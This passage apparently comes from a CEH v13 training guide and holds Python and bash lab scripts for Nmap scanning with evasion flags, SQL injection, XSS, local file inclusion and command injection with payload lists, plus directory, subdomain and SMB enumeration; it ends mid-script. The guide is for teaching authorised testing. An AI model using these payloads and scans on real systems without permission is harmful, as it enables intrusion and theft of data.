LAB_NMAP_FLAGS = "-sS -sV -O -sC -T4"  # Edit scan flags as needed
LAB_OUTPUT_BASE = "lab-enum-results"   # Edit output filename base
LAB_EXCLUDED_PORTS = "9100,9101"       # Optional: Edit/remove ports to exclude
# -----------------------------------------------------------------------------------

def log_message(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [INFO] {msg}")

def run_nmap_scan(scan_type, extra_flags="", output_suffix=""):
    output_file = f"{LAB_OUTPUT_BASE}-{output_suffix}.xml"
    cmd = [
        "nmap",
        *LAB_NMAP_FLAGS.split(),
        "-oX", output_file,
        *extra_flags.split(),
        LAB_TARGET
    ]
    if LAB_EXCLUDED_PORTS:
        cmd.extend(["--exclude-ports", LAB_EXCLUDED_PORTS])
    log_message(f"Running {scan_type} scan on {LAB_TARGET}...")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        log_message(f"{scan_type} scan completed successfully! Output: {output_file}")
        return output_file
    except subprocess.CalledProcessError as e:
        log_message(f"ERROR: {scan_type} scan failed: {e.stderr}")
        return None

def main():
    log_message("="*80)
    log_message("LAB-ONLY: CEH v13 Master Nmap Enumeration Automation Starting")
    log_message("="*80)
    scans = [
        ("Full TCP SYN + Version + OS", "-p-", "full-tcp"),
        ("UDP Top 100", "-sU --top-ports 100", "udp-top100"),
        ("NSE Vulnerability Scripts", "--script=vuln,auth,exploit", "nse-vuln"),
        ("Firewall Evasion Test", "-f -D RND:5 -g 53", "evasion-test")
    ]
    for scan_name, extra_flags, suffix in scans:
        run_nmap_scan(scan_name, extra_flags, suffix)
    log_message("="*80)
    log_message("All scans completed (LAB ONLY)!")
    log_message("="*80)

if __name__ == "__main__":
    # Quick validation: Check if target is private lab IP
    if not (LAB_TARGET.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")) or LAB_TARGET == "localhost" or LAB_TARGET == "127.0.0.1"):
        print("ERROR: This script is LAB-ONLY! Use only private lab IP ranges!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 01-advanced-nmap-enum.py` for packet capture/port scanning, or `./01-advanced-nmap-enum.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 247 : Error-Based SQL Injection Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Error-Based SQL Injection Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Error-Based SQL Injection Tester
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="  # Change to YOUR lab URL
LAB_PAYLOADS = [
    "'", "''", "\"", "\"\"",
    "' OR 1=1 -- ",
    "' OR 1=2 -- ",
    "' ORDER BY 1 -- ",
    "' ORDER BY 2 -- ",
    "' ORDER BY 3 -- ",
    "' UNION SELECT 1,2,3 -- ",
    "' UNION SELECT @@version,2,3 -- ",
    "' UNION SELECT user(),2,3 -- ",
    "' UNION SELECT database(),2,3 -- "
]
LAB_ERROR_INDICATORS = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite"]
# -----------------------------------------------------------------------------------

def test_sqli(url, payload):
    full_url = f"{url}{payload}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)  # Lab-only: verify=False is okay
        for indicator in LAB_ERROR_INDICATORS:
            if indicator.lower() in response.text.lower():
                return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Error-Based SQL Injection Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing payloads (LAB ONLY)...")
    print("-"*80)
    for payload in LAB_PAYLOADS:
        vulnerable, resp = test_sqli(LAB_TARGET_URL, payload)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Vulnerable"
        print(f"Payload: {payload:<50} â†’ {status}")
        if vulnerable:
            print(f"   Error snippet: {resp[:200]}...")
            print("-"*80)

if __name__ == "__main__":
    # Quick validation: Check if target URL is private lab IP
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: This script is LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # Lab-only
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 02-error-based-sqli.py` for packet capture/port scanning, or `./02-error-based-sqli.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 248 : Reflected/Stored XSS Scanner & Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Reflected/Stored XSS Scanner & Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Reflected/Stored XSS Scanner & Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/xss.php?input="  # Change to YOUR lab URL
LAB_XSS_PAYLOADS = [
    "<script>alert('LAB-TEST')</script>",
    "<img src=x onerror=alert('LAB-TEST')>",
    "<svg onload=alert('LAB-TEST')>",
    "'\"><script>alert('LAB-TEST')</script>",
    "<body onload=alert('LAB-TEST')>",
    "<iframe src=\"javascript:alert('LAB-TEST')\">",
    "<marquee><h1>LAB-TEST-XSS</h1></marquee>"
]
LAB_CHECK_STR = "LAB-TEST"  # What to look for in response
# -----------------------------------------------------------------------------------

def test_xss(url, payload):
    full_url = f"{url}{requests.utils.quote(payload)}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)
        if LAB_CHECK_STR in response.text:
            return True
        return False
    except Exception as e:
        return False

def main():
    print("="*80)
    print("LAB-ONLY: XSS Scanner & Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing XSS payloads (LAB ONLY)...")
    print("-"*80)
    for payload in LAB_XSS_PAYLOADS:
        vulnerable = test_xss(LAB_TARGET_URL, payload)
        status = "ðŸ”´ POSSIBLY VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<60} â†’ {status}")
        if vulnerable:
            print(f"   Manual verification needed (check lab browser)!")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY script! Use private lab IPs!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 03-xss-tester.py` for packet capture/port scanning, or `./03-xss-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 249 : Local File Inclusion (LFI) Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Local File Inclusion (LFI) Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: LFI (Local File Inclusion) Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/lfi.php?file="  # YOUR lab URL
LAB_LFI_TRAVERSAL_PAYLOADS = [
    "/etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",  # Bypass dot-filter
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",  # URL-encoded
    "/etc/hostname",
    "/proc/self/environ"
]
LAB_WINDOWS_LFI = [
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "../../Windows/win.ini"
]
LAB_CHECK_STR_LINUX = "root:x:"  # Check for /etc/passwd content
LAB_CHECK_STR_WINDOWS = "[extensions]"  # Check for win.ini
# -----------------------------------------------------------------------------------

def test_lfi(url, payload, check_str):
    full_url = f"{url}{requests.utils.quote(payload)}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)
        if check_str.lower() in response.text.lower():
            return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Local File Inclusion (LFI) Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing Linux LFI payloads first...")
    print("-"*80)
    for payload in LAB_LFI_TRAVERSAL_PAYLOADS:
        vulnerable, resp = test_lfi(LAB_TARGET_URL, payload, LAB_CHECK_STR_LINUX)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<50} â†’ {status}")
        if vulnerable:
            print(f"   Snippet: {resp[:250]}...")
    print("\nTesting Windows LFI payloads...")
    for payload in LAB_WINDOWS_LFI:
        vulnerable, resp = test_lfi(LAB_TARGET_URL, payload, LAB_CHECK_STR_WINDOWS)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<50} â†’ {status}")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 04-lfi-tester.py` for packet capture/port scanning, or `./04-lfi-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 250 : Command Injection Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Command Injection Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Command Injection Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/cmd.php?host="  # YOUR lab URL
LAB_CMD_INJECTION_PAYLOADS = [
    "; id",
    "&& id",
    "|| id",
    "| id",
    "`id`",  # Backtick injection
    "$(id)",  # Command substitution
    "; whoami",
    "; ls -la",
    "; uname -a",
    ";& echo LABTEST",
    "| echo LABTEST"
]
LAB_WINDOWS_PAYLOADS = [
    "& dir",
    "&& whoami",
    "| echo LABTEST",
    "; ipconfig"
]
LAB_CHECK_STR = "uid="  # Linux id command output; change to "Windows IP" for Windows
# -----------------------------------------------------------------------------------

def test_cmd_injection(url, payload, check_str):
    full_url = f"{url}{requests.utils.quote(payload)}"
    try:
        response = requests.get(full_url, timeout=10, verify=False)
        if check_str.lower() in response.text.lower():
            return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Command Injection Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing Linux payloads first...")
    print("-"*80)
    for payload in LAB_CMD_INJECTION_PAYLOADS:
        vulnerable, resp = test_cmd_injection(LAB_TARGET_URL, payload, LAB_CHECK_STR)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<40} â†’ {status}")
        if vulnerable:
            print(f"   Output snippet: {resp[:200]}...")
    print("\nTesting Windows payloads...")
    for payload in LAB_WINDOWS_PAYLOADS:
        vulnerable, resp = test_cmd_injection(LAB_TARGET_URL, payload, "Windows")
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<40} â†’ {status}")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 05-cmd-injection-tester.py` for packet capture/port scanning, or `./05-cmd-injection-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 251 : Advanced Subdomain Enumeration (OSINT)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Subdomain Enumeration (OSINT)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Advanced Subdomain Enumeration (OSINT)
# CEH v13 Master Module 02
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import requests
import re

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_DOMAIN = "lab-domain.local"  # YOUR lab domain to enumerate
LAB_WORDLIST_PATH = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"  # Edit path as needed
LAB_NAMESERVERS = ["8.8.8.8", "1.1.1.1"]  # Optional: Use your lab DNS
LAB_CHECK_HTTP = True  # Also check if subdomain has HTTP/HTTPS server?
# -----------------------------------------------------------------------------------

def brute_subdomains(domain, wordlist):
    found = []
    print(f"Brute-forcing subdomains for {domain} from wordlist...")
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
            total = len(lines)
            for i, sub in enumerate(lines):
                if not sub or sub.startswith("#"):
                    continue
                full = f"{sub}.{domain}"
                if i % 500 == 0:
                    print(f"Progress: {i}/{total} ({(i/total)*100:.1f}%)")
                try:
                    # Quick DNS check (using requests to simulate, or use dns.resolver for better)
                    # For lab, we'll just try a HEAD request if CHECK_HTTP is true
                    if LAB_CHECK_HTTP:
                        for proto in ["http://", "https://"]:
                            try:
                                r = requests.head(f"{proto}{full}", timeout=2, verify=False)
                                found.append(f"{proto}{full}")
                                break
                            except:
                                pass
                except Exception as e:
                    pass
    except FileNotFoundError:
        print(f"ERROR: Wordlist not found at {wordlist}!")
        print("Edit LAB_WORDLIST_PATH in the script!")
        return []
    return found

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Subdomain Enumeration")
    print("="*80)
    print(f"Target Domain: {LAB_TARGET_DOMAIN}")
    print("-"*80)
    results = brute_subdomains(LAB_TARGET_DOMAIN, LAB_WORDLIST_PATH)
    print("-"*80)
    if results:
        print(f"âœ… Found {len(results)} subdomains:")
        for sd in results:
            print(f"  - {sd}")
    else:
        print("No subdomains found (lab-only domain may be invalid, or wordlist is wrong)")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 06-subdomain-enum.py` for packet capture/port scanning, or `./06-subdomain-enum.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 252 : Basic Active Directory Enumeration (SMB/LDAP)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Basic Active Directory Enumeration (SMB/LDAP)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Basic Active Directory Enumeration (SMB/LDAP)
# CEH v13 Master Module 04, 05
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN_CONTROLLER = "192.168.100.10"  # YOUR lab DC IP
LAB_DOMAIN_NAME = "LAB.LOCAL"              # YOUR lab domain name
LAB_USERNAME = ""                          # Optional: lab user (if needed)
LAB_PASSWORD = ""                          # Optional: lab pass
# -----------------------------------------------------------------------------------

def run_enum4linux():
    print("Running enum4linux-ng (lab-only)...")
    cmd = ["enum4linux-ng", LAB_DOMAIN_CONTROLLER, "-A"]
    if LAB_USERNAME and LAB_PASSWORD:
        cmd.extend(["-u", LAB_USERNAME, "-p", LAB_PASSWORD])
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print("STDERR:", result.stderr)
    except FileNotFoundError:
        print("ERROR: enum4linux-ng not found! Install it first!")

def run_smbclient():
    print("\nTesting SMB null session (lab-only)...")
    cmd = ["smbclient", "-L", f"//{LAB_DOMAIN_CONTROLLER}", "-N"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: Active Directory Enumeration Helper")
    print("="*80)
    print(f"Target DC: {LAB_DOMAIN_CONTROLLER}")
    print("-"*80)
    run_enum4linux()
    run_smbclient()

if __name__ == "__main__":
    if not (LAB_DOMAIN_CONTROLLER.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168."))):
        print("ERROR: LAB-ONLY! Use private lab IP!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 07-ad-enum-helper.py` for packet capture/port scanning, or `./07-ad-enum-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 253 : Web Directory & File Brute-Forcer

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Web Directory & File Brute-Forcer

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Web Directory & File Brute-Forcer
# CEH v13 Master Module 02,04
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/"  # YOUR lab web target (trailing slash!)
LAB_WORDLIST_PATH = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
LAB_EXTENSIONS = ["", ".php", ".html", ".txt", ".bak", ".old", ".zip", ".sql"]
LAB_THREADS = 20  # Number of threads (don't overload lab!)
LAB_SUCCESS_CODES = [200, 204, 301, 302, 307, 401, 403]
# -----------------------------------------------------------------------------------

def test_path(base, path):
    try:
        full_url = base.rstrip("/") + "/" + path.lstrip("/")
        response = requests.head(full_url, timeout=3, allow_redirects=True, verify=False)
        if response.status_code in LAB_SUCCESS_CODES:
            return (response.status_code, full_url)
        return None
    except:
        return None

def main():
    print("="*80)
    print("LAB-ONLY: Web Directory & File Brute-Forcer")
    print("="*80)
    print(f"Target: {LAB_TARGET_URL}")
    print(f"Extensions: {LAB_EXTENSIONS}")
    print("-"*80)
    try:
        with open(LAB_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
            paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"ERROR: Wordlist not found at {LAB_WORDLIST_PATH}! Edit script!")
        sys.exit(1)
    found = []
    print(f"Starting brute-force with {LAB_THREADS} threads on {len(paths)} base paths (+ extensions)...")
    with ThreadPoolExecutor(max_workers=LAB_THREADS) as executor:
        futures = []
        for path in paths:
            for ext in LAB_EXTENSIONS:
                test_p = path + ext
                futures.append(executor.submit(test_path, LAB_TARGET_URL, test_p))
        for i, future in enumerate(as_completed(futures)):
            if i % 250 == 0 and i > 0:
                print(f"Checked {i} paths so far...")
            res = future.result()
            if res:
                found.append(res)
                print(f"âœ… [{res[0]}] {res[1]}")
    print("-"*80)
    print(f"Scan complete! Found {len(found)} paths/files!")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Private lab targets only!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 08-web-dir-brute.py` for packet capture/port scanning, or `./08-web-dir-brute.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 254 : Quick Nmap Stealth Scan Wrapper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Quick Nmap Stealth Scan Wrapper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```bash
﻿#!/bin/bash
# LAB-ONLY: Quick Nmap Stealth Scan Wrapper
# CEH v13 Master Module 03
# STRICTLY FOR AUTHORIZED LAB USE ONLY!

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET="192.168.100.0/24"          # YOUR lab target CIDR
LAB_DECOYS="10.0.0.5,10.0.0.6,10.0.0.7" # YOUR lab decoys
LAB_ZOMBIE="192.168.100.20:80"          # YOUR lab zombie (for idle scan)
LAB_OUTPUT_DIR="$HOME/lab-scan-results" # YOUR output folder
# -----------------------------------------------------------------------------------

mkdir -p "$LAB_OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
echo "================================================"
echo "LAB-ONLY: Nmap Stealth Scan Wrapper Starting"
echo "Target: $LAB_TARGET"
echo "================================================"

# 1. ARP Ping Sweep (fastest local lab)
echo "1. Running ARP ping sweep..."
